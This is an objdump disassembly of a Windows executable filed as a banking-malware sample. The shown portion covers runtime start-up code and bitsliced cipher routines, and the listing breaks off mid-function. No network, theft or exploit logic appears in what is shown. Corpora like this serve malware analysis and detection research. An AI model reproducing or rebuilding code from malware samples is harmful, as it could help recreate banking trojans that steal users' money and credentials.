
malware_samples/banker/21b02917b796ad0aaac9d6fcb4f7f82a24f6f192c95d360e0873d43abc2adc9b.exe:     file format pei-x86-64


Disassembly of section .text:

0000000069681000 <.text>:
    69681000:	48 8d 0d f9 7f 0f 00 	lea    0xf7ff9(%rip),%rcx        # 0x69779000
    69681007:	e9 84 b3 00 00       	jmp    0x6968c390
    6968100c:	0f 1f 40 00          	nopl   0x0(%rax)
    69681010:	41 55                	push   %r13
    69681012:	41 54                	push   %r12
    69681014:	55                   	push   %rbp
    69681015:	57                   	push   %rdi
    69681016:	56                   	push   %rsi
    69681017:	53                   	push   %rbx
    69681018:	48 83 ec 28          	sub    $0x28,%rsp
    6968101c:	85 d2                	test   %edx,%edx
    6968101e:	49 89 cc             	mov    %rcx,%r12
    69681021:	4d 89 c5             	mov    %r8,%r13
    69681024:	75 7a                	jne    0x696810a0
    69681026:	8b 15 ec 7f 0f 00    	mov    0xf7fec(%rip),%edx        # 0x69779018
    6968102c:	31 c0                	xor    %eax,%eax
    6968102e:	85 d2                	test   %edx,%edx
    69681030:	7e 59                	jle    0x6968108b
    69681032:	83 ea 01             	sub    $0x1,%edx
    69681035:	48 8b 1d 94 4a 0f 00 	mov    0xf4a94(%rip),%rbx        # 0x69775ad0
    6968103c:	31 ed                	xor    %ebp,%ebp
    6968103e:	bf 01 00 00 00       	mov    $0x1,%edi
    69681043:	89 15 cf 7f 0f 00    	mov    %edx,0xf7fcf(%rip)        # 0x69779018
    69681049:	4c 8b 25 2c d2 10 00 	mov    0x10d22c(%rip),%r12        # 0x6978e27c
    69681050:	eb 08                	jmp    0x6968105a
    69681052:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    69681057:	41 ff d4             	call   *%r12
    6968105a:	48 89 e8             	mov    %rbp,%rax
    6968105d:	f0 48 0f b1 3b       	lock cmpxchg %rdi,(%rbx)
    69681062:	48 85 c0             	test   %rax,%rax
    69681065:	48 89 c6             	mov    %rax,%rsi
    69681068:	75 e8                	jne    0x69681052
    6968106a:	48 8b 3d 6f 4a 0f 00 	mov    0xf4a6f(%rip),%rdi        # 0x69775ae0
    69681071:	8b 07                	mov    (%rdi),%eax
    69681073:	83 f8 02             	cmp    $0x2,%eax
    69681076:	0f 84 e9 00 00 00    	je     0x69681165
    6968107c:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    69681081:	e8 02 b3 00 00       	call   0x6968c388
    69681086:	b8 01 00 00 00       	mov    $0x1,%eax
    6968108b:	48 83 c4 28          	add    $0x28,%rsp
    6968108f:	5b                   	pop    %rbx
    69681090:	5e                   	pop    %rsi
    69681091:	5f                   	pop    %rdi
    69681092:	5d                   	pop    %rbp
    69681093:	41 5c                	pop    %r12
    69681095:	41 5d                	pop    %r13
    69681097:	c3                   	ret
    69681098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    6968109f:	00 
    696810a0:	83 fa 01             	cmp    $0x1,%edx
    696810a3:	0f 85 aa 00 00 00    	jne    0x69681153
    696810a9:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
    696810b0:	00 00 
    696810b2:	48 8b 1d 17 4a 0f 00 	mov    0xf4a17(%rip),%rbx        # 0x69775ad0
    696810b9:	31 ff                	xor    %edi,%edi
    696810bb:	48 8b 70 08          	mov    0x8(%rax),%rsi
    696810bf:	48 8b 2d b6 d1 10 00 	mov    0x10d1b6(%rip),%rbp        # 0x6978e27c
    696810c6:	eb 18                	jmp    0x696810e0
    696810c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
    696810cf:	00 
    696810d0:	48 39 c6             	cmp    %rax,%rsi
    696810d3:	0f 84 b7 00 00 00    	je     0x69681190
    696810d9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
    696810de:	ff d5                	call   *%rbp
    696810e0:	48 89 f8             	mov    %rdi,%rax
    696810e3:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
    696810e8:	48 85 c0             	test   %rax,%rax
    696810eb:	75 e3                	jne    0x696810d0
    696810ed:	31 ff                	xor    %edi,%edi
    696810ef:	48 8b 35 ea 49 0f 00 	mov    0xf49ea(%rip),%rsi        # 0x69775ae0
    696810f6:	8b 06                	mov    (%rsi),%eax
    696810f8:	83 f8 01             	cmp    $0x1,%eax
    696810fb:	0f 84 ef 00 00 00    	je     0x696811f0
    69681101:	8b 06                	mov    (%rsi),%eax
    69681103:	85 c0                	test   %eax,%eax
    69681105:	0f 84 a5 00 00 00    	je     0x696811b0
    6968110b:	8b 06                	mov    (%rsi),%eax
    6968110d:	83 f8 01             	cmp    $0x1,%eax
    69681110:	0f 84 ba 00 00 00    	je     0x696811d0
    69681116:	85 ff                	test   %edi,%edi
    69681118:	0f 84 82 00 00 00    	je     0x696811a0
    6968111e:	48 8b 05 7b 49 0f 00 	mov    0xf497b(%rip),%rax        # 0x69775aa0
    69681125:	48 8b 00             	mov    (%rax),%rax
    69681128:	48 85 c0             	test   %rax,%rax
    6968112b:	74 0d                	je     0x6968113a
    6968112d:	4d 89 e8             	mov    %r13,%r8
    69681130:	ba 02 00 00 00       	mov    $0x2,%edx
    69681135:	4c 89 e1             	mov    %r12,%rcx
    69681138:	ff d0                	call   *%rax
    6968113a:	83 05 d7 7e 0f 00 01 	addl   $0x1,0xf7ed7(%rip)        # 0x69779018
    69681141:	b8 01 00 00 00       	mov    $0x1,%eax
    69681146:	48 83 c4 28          	add    $0x28,%rsp
    6968114a:	5b                   	pop    %rbx
    6968114b:	5e                   	pop    %rsi
    6968114c:	5f                   	pop    %rdi
    6968114d:	5d                   	pop    %rbp
    6968114e:	41 5c                	pop    %r12
    69681150:	41 5d                	pop    %r13
    69681152:	c3                   	ret
    69681153:	b8 01 00 00 00       	mov    $0x1,%eax
    69681158:	48 83 c4 28          	add    $0x28,%rsp
    6968115c:	5b                   	pop    %rbx
    6968115d:	5e                   	pop    %rsi
    6968115e:	5f                   	pop    %rdi
    6968115f:	5d                   	pop    %rbp
    69681160:	41 5c                	pop    %r12
    69681162:	41 5d                	pop    %r13
    69681164:	c3                   	ret
    69681165:	48 8d 0d 94 7e 0f 00 	lea    0xf7e94(%rip),%rcx        # 0x69779000
    6968116c:	e8 1f b3 00 00       	call   0x6968c490
    69681171:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
    69681177:	48 87 33             	xchg   %rsi,(%rbx)
    6968117a:	b8 01 00 00 00       	mov    $0x1,%eax
    6968117f:	48 83 c4 28          	add    $0x28,%rsp
    69681183:	5b                   	pop    %rbx
    69681184:	5e                   	pop    %rsi
    69681185:	5f                   	pop    %rdi
    69681186:	5d                   	pop    %rbp
    69681187:	41 5c                	pop    %r12
    69681189:	41 5d                	pop    %r13
    6968118b:	c3                   	ret
    6968118c:	0f 1f 40 00          	nopl   0x0(%rax)
    69681190:	bf 01 00 00 00       	mov    $0x1,%edi
    69681195:	e9 55 ff ff ff       	jmp    0x696810ef
    6968119a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    696811a0:	31 c0                	xor    %eax,%eax
    696811a2:	48 87 03             	xchg   %rax,(%rbx)
    696811a5:	e9 74 ff ff ff       	jmp    0x6968111e
    696811aa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    696811b0:	48 8b 15 69 49 0f 00 	mov    0xf4969(%rip),%rdx        # 0x69775b20
    696811b7:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
    696811bd:	48 8b 0d 4c 49 0f 00 	mov    0xf494c(%rip),%rcx        # 0x69775b10
    696811c4:	e8 af b1 00 00       	call   0x6968c378
    696811c9:	e9 3d ff ff ff       	jmp    0x6968110b
    696811ce:	66 90                	xchg   %ax,%ax
    696811d0:	48 8b 15 29 49 0f 00 	mov    0xf4929(%rip),%rdx        # 0x69775b00
    696811d7:	48 8b 0d 12 49 0f 00 	mov    0xf4912(%rip),%rcx        # 0x69775af0
    696811de:	e8 95 b1 00 00       	call   0x6968c378
    696811e3:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
    696811e9:	e9 28 ff ff ff       	jmp    0x69681116
    696811ee:	66 90                	xchg   %ax,%ax
    696811f0:	b9 1f 00 00 00       	mov    $0x1f,%ecx
    696811f5:	e8 8e b1 00 00       	call   0x6968c388
    696811fa:	e9 0c ff ff ff       	jmp    0x6968110b
    696811ff:	90                   	nop
    69681200:	41 54                	push   %r12
    69681202:	55                   	push   %rbp
    69681203:	57                   	push   %rdi
    69681204:	56                   	push   %rsi
    69681205:	53                   	push   %rbx
    69681206:	48 83 ec 20          	sub    $0x20,%rsp
    6968120a:	48 8b 35 af 48 0f 00 	mov    0xf48af(%rip),%rsi        # 0x69775ac0
    69681211:	85 d2                	test   %edx,%edx
    69681213:	48 89 cf             	mov    %rcx,%rdi
    69681216:	89 d3                	mov    %edx,%ebx
    69681218:	89 16                	mov    %edx,(%rsi)
    6968121a:	4c 89 c5             	mov    %r8,%rbp
    6968121d:	75 54                	jne    0x69681273
    6968121f:	8b 05 f3 7d 0f 00    	mov    0xf7df3(%rip),%eax        # 0x69779018
    69681225:	85 c0                	test   %eax,%eax
    69681227:	74 33                	je     0x6968125c
    69681229:	e8 f2 a2 00 00       	call   0x6968b520
    6968122e:	49 89 e8             	mov    %rbp,%r8
    69681231:	31 d2                	xor    %edx,%edx
    69681233:	48 89 f9             	mov    %rdi,%rcx
    69681236:	e8 8c 74 00 00       	call   0x696886c7
    6968123b:	49 89 e8             	mov    %rbp,%r8
    6968123e:	89 da                	mov    %ebx,%edx
    69681240:	48 89 f9             	mov    %rdi,%rcx
    69681243:	e8 b8 b0 00 00       	call   0x6968c300
    69681248:	49 89 e8             	mov    %rbp,%r8
    6968124b:	89 da                	mov    %ebx,%edx
    6968124d:	48 89 f9             	mov    %rdi,%rcx
    69681250:	41 89 c4             	mov    %eax,%r12d
    69681253:	e8 b8 fd ff ff       	call   0x69681010
    69681258:	85 c0                	test   %eax,%eax
    6968125a:	75 03                	jne    0x6968125f
    6968125c:	45 31 e4             	xor    %r12d,%r12d
    6968125f:	44 89 e0             	mov    %r12d,%eax
    69681262:	c7 06 ff ff ff ff    	movl   $0xffffffff,(%rsi)
    69681268:	48 83 c4 20          	add    $0x20,%rsp
    6968126c:	5b                   	pop    %rbx
    6968126d:	5e                   	pop    %rsi
    6968126e:	5f                   	pop    %rdi
    6968126f:	5d                   	pop    %rbp
    69681270:	41 5c                	pop    %r12
    69681272:	c3                   	ret
    69681273:	e8 a8 a2 00 00       	call   0x6968b520
    69681278:	8d 43 ff             	lea    -0x1(%rbx),%eax
    6968127b:	83 f8 01             	cmp    $0x1,%eax
    6968127e:	76 20                	jbe    0x696812a0
    69681280:	49 89 e8             	mov    %rbp,%r8
    69681283:	89 da                	mov    %ebx,%edx
    69681285:	48 89 f9             	mov    %rdi,%rcx
    69681288:	e8 3a 74 00 00       	call   0x696886c7
    6968128d:	83 fb 03             	cmp    $0x3,%ebx
    69681290:	41 89 c4             	mov    %eax,%r12d
    69681293:	75 ca                	jne    0x6968125f
    69681295:	eb a4                	jmp    0x6968123b
    69681297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    6968129e:	00 00 
    696812a0:	49 89 e8             	mov    %rbp,%r8
    696812a3:	89 da                	mov    %ebx,%edx
    696812a5:	48 89 f9             	mov    %rdi,%rcx
    696812a8:	e8 63 fd ff ff       	call   0x69681010
    696812ad:	85 c0                	test   %eax,%eax
    696812af:	74 ab                	je     0x6968125c
    696812b1:	49 89 e8             	mov    %rbp,%r8
    696812b4:	89 da                	mov    %ebx,%edx
    696812b6:	48 89 f9             	mov    %rdi,%rcx
    696812b9:	e8 42 b0 00 00       	call   0x6968c300
    696812be:	85 c0                	test   %eax,%eax
    696812c0:	41 89 c4             	mov    %eax,%r12d
    696812c3:	74 5b                	je     0x69681320
    696812c5:	83 fb 01             	cmp    $0x1,%ebx
    696812c8:	75 b6                	jne    0x69681280
    696812ca:	e8 a1 9d 00 00       	call   0x6968b070
    696812cf:	49 89 e8             	mov    %rbp,%r8
    696812d2:	ba 01 00 00 00       	mov    $0x1,%edx
    696812d7:	48 89 f9             	mov    %rdi,%rcx
    696812da:	e8 e8 73 00 00       	call   0x696886c7
    696812df:	85 c0                	test   %eax,%eax
    696812e1:	41 89 c4             	mov    %eax,%r12d
    696812e4:	0f 85 75 ff ff ff    	jne    0x6968125f
    696812ea:	49 89 e8             	mov    %rbp,%r8
    696812ed:	31 d2                	xor    %edx,%edx
    696812ef:	48 89 f9             	mov    %rdi,%rcx
    696812f2:	e8 d0 73 00 00       	call   0x696886c7
    696812f7:	49 89 e8             	mov    %rbp,%r8
    696812fa:	31 d2                	xor    %edx,%edx
    696812fc:	48 89 f9             	mov    %rdi,%rcx
    696812ff:	e8 fc af 00 00       	call   0x6968c300
    69681304:	49 89 e8             	mov    %rbp,%r8
    69681307:	31 d2                	xor    %edx,%edx
    69681309:	48 89 f9             	mov    %rdi,%rcx
    6968130c:	e8 ff fc ff ff       	call   0x69681010
    69681311:	e9 49 ff ff ff       	jmp    0x6968125f
    69681316:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    6968131d:	00 00 00 
    69681320:	83 fb 01             	cmp    $0x1,%ebx
    69681323:	0f 85 33 ff ff ff    	jne    0x6968125c
    69681329:	eb d9                	jmp    0x69681304
    6968132b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
    69681330:	48 83 ec 48          	sub    $0x48,%rsp
    69681334:	48 8b 05 f5 47 0f 00 	mov    0xf47f5(%rip),%rax        # 0x69775b30
    6968133b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
    69681341:	83 fa 01             	cmp    $0x1,%edx
    69681344:	74 0a                	je     0x69681350
    69681346:	48 83 c4 48          	add    $0x48,%rsp
    6968134a:	e9 b1 fe ff ff       	jmp    0x69681200
    6968134f:	90                   	nop
    69681350:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
    69681355:	89 54 24 34          	mov    %edx,0x34(%rsp)
    69681359:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
    6968135e:	e8 2d 9d 00 00       	call   0x6968b090
    69681363:	e8 18 a6 00 00       	call   0x6968b980
    69681368:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
    6968136d:	8b 54 24 34          	mov    0x34(%rsp),%edx
    69681371:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    69681376:	48 83 c4 48          	add    $0x48,%rsp
    6968137a:	e9 81 fe ff ff       	jmp    0x69681200
    6968137f:	90                   	nop
    69681380:	48 89 ca             	mov    %rcx,%rdx
    69681383:	48 8d 0d 76 7c 0f 00 	lea    0xf7c76(%rip),%rcx        # 0x69779000
    6968138a:	e9 31 b0 00 00       	jmp    0x6968c3c0
    6968138f:	90                   	nop
    69681390:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x696813a0
    69681397:	e9 e4 ff ff ff       	jmp    0x69681380
    6968139c:	0f 1f 40 00          	nopl   0x0(%rax)
    696813a0:	c3                   	ret
    696813a1:	90                   	nop
    696813a2:	90                   	nop
    696813a3:	90                   	nop
    696813a4:	90                   	nop
    696813a5:	90                   	nop
    696813a6:	90                   	nop
    696813a7:	90                   	nop
    696813a8:	90                   	nop
    696813a9:	90                   	nop
    696813aa:	90                   	nop
    696813ab:	90                   	nop
    696813ac:	90                   	nop
    696813ad:	90                   	nop
    696813ae:	90                   	nop
    696813af:	90                   	nop
    696813b0:	49 ba ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r10
    696813b7:	00 ff 00 
    696813ba:	49 89 d1             	mov    %rdx,%r9
    696813bd:	4c 89 c0             	mov    %r8,%rax
    696813c0:	48 c1 ea 08          	shr    $0x8,%rdx
    696813c4:	4d 21 d1             	and    %r10,%r9
    696813c7:	49 c1 e8 08          	shr    $0x8,%r8
    696813cb:	4c 21 d0             	and    %r10,%rax
    696813ce:	4c 21 d2             	and    %r10,%rdx
    696813d1:	4d 21 d0             	and    %r10,%r8
    696813d4:	4d 89 ca             	mov    %r9,%r10
    696813d7:	49 c1 ea 08          	shr    $0x8,%r10
    696813db:	4d 09 d1             	or     %r10,%r9
    696813de:	49 89 c2             	mov    %rax,%r10
    696813e1:	49 c1 ea 08          	shr    $0x8,%r10
    696813e5:	4c 09 d0             	or     %r10,%rax
    696813e8:	49 89 d2             	mov    %rdx,%r10
    696813eb:	49 c1 ea 08          	shr    $0x8,%r10
    696813ef:	4c 09 d2             	or     %r10,%rdx
    696813f2:	4d 89 c2             	mov    %r8,%r10
    696813f5:	49 c1 ea 08          	shr    $0x8,%r10
    696813f9:	4d 09 d0             	or     %r10,%r8
    696813fc:	49 ba ff ff 00 00 ff 	movabs $0xffff0000ffff,%r10
    69681403:	ff 00 00 
    69681406:	4d 21 d1             	and    %r10,%r9
    69681409:	4c 21 d0             	and    %r10,%rax
    6968140c:	4c 21 d2             	and    %r10,%rdx
    6968140f:	4d 21 d0             	and    %r10,%r8
    69681412:	4d 89 ca             	mov    %r9,%r10
    69681415:	49 c1 ea 10          	shr    $0x10,%r10
    69681419:	45 09 d1             	or     %r10d,%r9d
    6968141c:	44 89 09             	mov    %r9d,(%rcx)
    6968141f:	49 89 c1             	mov    %rax,%r9
    69681422:	49 c1 e9 10          	shr    $0x10,%r9
    69681426:	44 09 c8             	or     %r9d,%eax
    69681429:	89 41 04             	mov    %eax,0x4(%rcx)
    6968142c:	48 89 d0             	mov    %rdx,%rax
    6968142f:	48 c1 e8 10          	shr    $0x10,%rax
    69681433:	09 c2                	or     %eax,%edx
    69681435:	4c 89 c0             	mov    %r8,%rax
    69681438:	48 c1 e8 10          	shr    $0x10,%rax
    6968143c:	89 51 08             	mov    %edx,0x8(%rcx)
    6968143f:	41 09 c0             	or     %eax,%r8d
    69681442:	44 89 41 0c          	mov    %r8d,0xc(%rcx)
    69681446:	c3                   	ret
    69681447:	56                   	push   %rsi
    69681448:	53                   	push   %rbx
    69681449:	48 bb 00 ff 00 ff 00 	movabs $0xff00ff00ff00ff00,%rbx
    69681450:	ff 00 ff 
    69681453:	45 8b 10             	mov    (%r8),%r10d
    69681456:	45 8b 58 04          	mov    0x4(%r8),%r11d
    6968145a:	45 8b 48 08          	mov    0x8(%r8),%r9d
    6968145e:	41 8b 40 0c          	mov    0xc(%r8),%eax
    69681462:	4d 89 d0             	mov    %r10,%r8
    69681465:	49 c1 e0 10          	shl    $0x10,%r8
    69681469:	4d 09 c2             	or     %r8,%r10
    6968146c:	4d 89 d8             	mov    %r11,%r8
    6968146f:	49 c1 e0 10          	shl    $0x10,%r8
    69681473:	4d 09 c3             	or     %r8,%r11
    69681476:	4d 89 c8             	mov    %r9,%r8
    69681479:	49 c1 e0 10          	shl    $0x10,%r8
    6968147d:	4d 09 c1             	or     %r8,%r9
    69681480:	49 89 c0             	mov    %rax,%r8
    69681483:	49 c1 e0 10          	shl    $0x10,%r8
    69681487:	4c 09 c0             	or     %r8,%rax
    6968148a:	49 b8 ff ff 00 00 ff 	movabs $0xffff0000ffff,%r8
    69681491:	ff 00 00 
    69681494:	4d 21 c2             	and    %r8,%r10
    69681497:	4d 21 c3             	and    %r8,%r11
    6968149a:	4d 21 c1             	and    %r8,%r9
    6968149d:	4c 21 c0             	and    %r8,%rax
    696814a0:	4d 89 d0             	mov    %r10,%r8
    696814a3:	49 c1 e0 08          	shl    $0x8,%r8
    696814a7:	48 89 c6             	mov    %rax,%rsi
    696814aa:	4d 09 c2             	or     %r8,%r10
    696814ad:	4d 89 d8             	mov    %r11,%r8
    696814b0:	48 c1 e6 08          	shl    $0x8,%rsi
    696814b4:	49 c1 e0 08          	shl    $0x8,%r8
    696814b8:	48 09 f0             	or     %rsi,%rax
    696814bb:	4d 09 c3             	or     %r8,%r11
    696814be:	4d 89 c8             	mov    %r9,%r8
    696814c1:	48 c1 e0 08          	shl    $0x8,%rax
    696814c5:	49 c1 e0 08          	shl    $0x8,%r8
    696814c9:	48 21 d8             	and    %rbx,%rax
    696814cc:	4d 09 c1             	or     %r8,%r9
    696814cf:	49 b8 ff 00 ff 00 ff 	movabs $0xff00ff00ff00ff,%r8
    696814d6:	00 ff 00 
    696814d9:	49 c1 e1 08          	shl    $0x8,%r9
    696814dd:	4d 21 c2             	and    %r8,%r10
    696814e0:	4d 21 c3             	and    %r8,%r11
    696814e3:	49 21 d9             	and    %rbx,%r9
    696814e6:	4c 09 d8             	or     %r11,%rax
    696814e9:	4d 09 d1             	or     %r10,%r9
    696814ec:	4c 89 09             	mov    %r9,(%rcx)
    696814ef:	48 89 02             	mov    %rax,(%rdx)
    696814f2:	5b                   	pop    %rbx
    696814f3:	5e                   	pop    %rsi
    696814f4:	c3                   	ret
    696814f5:	41 57                	push   %r15
    696814f7:	41 56                	push   %r14
    696814f9:	41 55                	push   %r13
    696814fb:	41 54                	push   %r12
    696814fd:	55                   	push   %rbp
    696814fe:	57                   	push   %rdi
    696814ff:	56                   	push   %rsi
    69681500:	53                   	push   %rbx
    69681501:	48 83 ec 78          	sub    $0x78,%rsp
    69681505:	48 8b 71 20          	mov    0x20(%rcx),%rsi
    69681509:	48 8b 51 38          	mov    0x38(%rcx),%rdx
    6968150d:	4c 8b 41 10          	mov    0x10(%rcx),%r8
    69681511:	4c 8b 59 30          	mov    0x30(%rcx),%r11
    69681515:	4c 8b 79 28          	mov    0x28(%rcx),%r15
    69681519:	48 89 f7             	mov    %rsi,%rdi
    6968151c:	4c 8b 11             	mov    (%rcx),%r10
    6968151f:	48 89 d3             	mov    %rdx,%rbx
    69681522:	48 89 d5             	mov    %rdx,%rbp
    69681525:	4c 31 c7             	xor    %r8,%rdi
    69681528:	48 8b 41 08          	mov    0x8(%rcx),%rax
    6968152c:	48 31 f3             	xor    %rsi,%rbx
    6968152f:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
    69681534:	48 89 d7             	mov    %rdx,%rdi
    69681537:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
    6968153c:	4d 31 df             	xor    %r11,%r15
    6968153f:	4c 31 c7             	xor    %r8,%rdi
    69681542:	48 8b 5c 24 18       	mov    0x18(%rsp),%rbx
    69681547:	4d 31 fa             	xor    %r15,%r10
    6968154a:	48 89 3c 24          	mov    %rdi,(%rsp)
    6968154e:	48 89 d7             	mov    %rdx,%rdi
    69681551:	4c 31 d7             	xor    %r10,%rdi
    69681554:	48 31 c5             	xor    %rax,%rbp
    69681557:	4c 31 d6             	xor    %r10,%rsi
    6968155a:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
    6968155f:	48 8b 3c 24          	mov    (%rsp),%rdi
    69681563:	49 89 ec             	mov    %rbp,%r12
    69681566:	48 31 eb             	xor    %rbp,%rbx
    69681569:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
    6968156e:	4c 89 fe             	mov    %r15,%rsi
    69681571:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
    69681576:	48 89 c3             	mov    %rax,%rbx
    69681579:	4c 8b 74 24 28       	mov    0x28(%rsp),%r14
    6968157e:	48 f7 d0             	not    %rax
    69681581:	4c 31 d3             	xor    %r10,%rbx
    69681584:	4c 33 71 18          	xor    0x18(%rcx),%r14
    69681588:	48 31 df             	xor    %rbx,%rdi
    6968158b:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
    69681590:	48 8b 19             	mov    (%rcx),%rbx
    69681593:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
    69681598:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
    6968159d:	4d 31 f0             	xor    %r14,%r8
    696815a0:	4d 31 de             	xor    %r11,%r14
    696815a3:	4c 8b 5c 24 18       	mov    0x18(%rsp),%r11
    696815a8:	4c 31 c3             	xor    %r8,%rbx
    696815ab:	4d 89 f1             	mov    %r14,%r9
    696815ae:	4c 31 c6             	xor    %r8,%rsi
    696815b1:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
    696815b6:	48 8b 19             	mov    (%rcx),%rbx
    696815b9:	49 f7 d1             	not    %r9
    696815bc:	4c 31 f7             	xor    %r14,%rdi
    696815bf:	4c 23 4c 24 20       	and    0x20(%rsp),%r9
    696815c4:	48 89 74 24 08       	mov    %rsi,0x8(%rsp)
    696815c9:	48 31 fe             	xor    %rdi,%rsi
    696815cc:	49 31 ff             	xor    %rdi,%r15
    696815cf:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
    696815d4:	49 21 f3             	and    %rsi,%r11
    696815d7:	4d 21 fc             	and    %r15,%r12
    696815da:	48 89 74 24 60       	mov    %rsi,0x60(%rsp)
    696815df:	48 31 fb             	xor    %rdi,%rbx
    696815e2:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
    696815e7:	4d 31 cb             	xor    %r9,%r11
    696815ea:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
    696815ef:	48 8b 1c 24          	mov    (%rsp),%rbx
    696815f3:	4d 89 dd             	mov    %r11,%r13
    696815f6:	48 23 5c 24 08       	and    0x8(%rsp),%rbx
    696815fb:	4c 8b 5c 24 48       	mov    0x48(%rsp),%r11
    69681600:	4c 23 5c 24 50       	and    0x50(%rsp),%r11
    69681605:	4c 21 c7             	and    %r8,%rdi
    69681608:	49 31 fe             	xor    %rdi,%r14
    6968160b:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
    69681610:	4c 31 cb             	xor    %r9,%rbx
    69681613:	48 23 31             	and    (%rcx),%rsi
    69681616:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
    6968161b:	4d 31 f3             	xor    %r14,%r11
    6968161e:	4c 8b 31             	mov    (%rcx),%r14
    69681621:	4d 31 eb             	xor    %r13,%r11
    69681624:	48 33 34 24          	xor    (%rsp),%rsi
    69681628:	4c 21 d0             	and    %r10,%rax
    6968162b:	4c 31 fa             	xor    %r15,%rdx
    6968162e:	4c 23 4c 24 58       	and    0x58(%rsp),%r9
    69681633:	48 31 e8             	xor    %rbp,%rax
    69681636:	48 33 74 24 08       	xor    0x8(%rsp),%rsi
    6968163b:	4c 31 f8             	xor    %r15,%rax
    6968163e:	4c 31 e0             	xor    %r12,%rax
    69681641:	49 31 d4             	xor    %rdx,%r12
    69681644:	4c 31 e8             	xor    %r13,%rax
    69681647:	4d 31 cc             	xor    %r9,%r12
    6968164a:	48 89 c2             	mov    %rax,%rdx
    6968164d:	48 31 fe             	xor    %rdi,%rsi
    69681650:	4d 89 e1             	mov    %r12,%r9
    69681653:	4d 89 dc             	mov    %r11,%r12
    69681656:	49 31 d9             	xor    %rbx,%r9
    69681659:	48 31 de             	xor    %rbx,%rsi
    6968165c:	49 21 c3             	and    %rax,%r11
    6968165f:	49 31 f4             	xor    %rsi,%r12
    69681662:	4c 89 cf             	mov    %r9,%rdi
    69681665:	4c 31 ca             	xor    %r9,%rdx
    69681668:	4c 31 df             	xor    %r11,%rdi
    6968166b:	4c 89 e3             	mov    %r12,%rbx
    6968166e:	48 21 fb             	and    %rdi,%rbx
    69681671:	48 31 f3             	xor    %rsi,%rbx
    69681674:	4c 31 de             	xor    %r11,%rsi
    69681677:	48 21 f2             	and    %rsi,%rdx
    6968167a:	4c 89 ce             	mov    %r9,%rsi
    6968167d:	49 31 d3             	xor    %rdx,%r11
    69681680:	48 31 d6             	xor    %rdx,%rsi
    69681683:	48 89 da             	mov    %rbx,%rdx
    69681686:	4d 21 d9             	and    %r11,%r9
    69681689:	48 31 f0             	xor    %rsi,%rax
    6968168c:	49 89 f5             	mov    %rsi,%r13
    6968168f:	4c 31 cf             	xor    %r9,%rdi
    69681692:	4c 31 c8             	xor    %r9,%rax
    69681695:	49 89 d9             	mov    %rbx,%r9
    69681698:	49 89 fb             	mov    %rdi,%r11
    6968169b:	49 31 f1             	xor    %rsi,%r9
    6968169e:	49 21 db             	and    %rbx,%r11
    696816a1:	4d 31 e3             	xor    %r12,%r11
    696816a4:	49 89 c4             	mov    %rax,%r12
    696816a7:	4d 31 dc             	xor    %r11,%r12
    696816aa:	4c 31 da             	xor    %r11,%rdx
    696816ad:	49 21 f6             	and    %rsi,%r14
    696816b0:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
    696816b5:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
    696816ba:	4c 89 e7             	mov    %r12,%rdi
    696816bd:	49 21 d7             	and    %rdx,%r15
    696816c0:	4c 31 cf             	xor    %r9,%rdi
    696816c3:	49 31 c5             	xor    %rax,%r13
    696816c6:	4d 21 da             	and    %r11,%r10
    696816c9:	4c 23 5c 24 40       	and    0x40(%rsp),%r11
    696816ce:	4d 21 e8             	and    %r13,%r8
    696816d1:	4c 23 6c 24 28       	and    0x28(%rsp),%r13
    696816d6:	4d 31 f8             	xor    %r15,%r8
    696816d9:	49 21 de             	and    %rbx,%r14
    696816dc:	48 23 5c 24 38       	and    0x38(%rsp),%rbx
    696816e1:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
    696816e6:	4c 8b 74 24 60       	mov    0x60(%rsp),%r14
    696816eb:	4c 33 5c 24 58       	xor    0x58(%rsp),%r11
    696816f0:	49 21 fe             	and    %rdi,%r14
    696816f3:	48 23 7c 24 18       	and    0x18(%rsp),%rdi
    696816f8:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
    696816fd:	4c 89 74 24 60       	mov    %r14,0x60(%rsp)
    69681702:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
    69681707:	49 21 c6             	and    %rax,%r14
    6968170a:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
    6968170f:	49 89 ee             	mov    %rbp,%r14
    69681712:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
    69681717:	49 21 d6             	and    %rdx,%r14
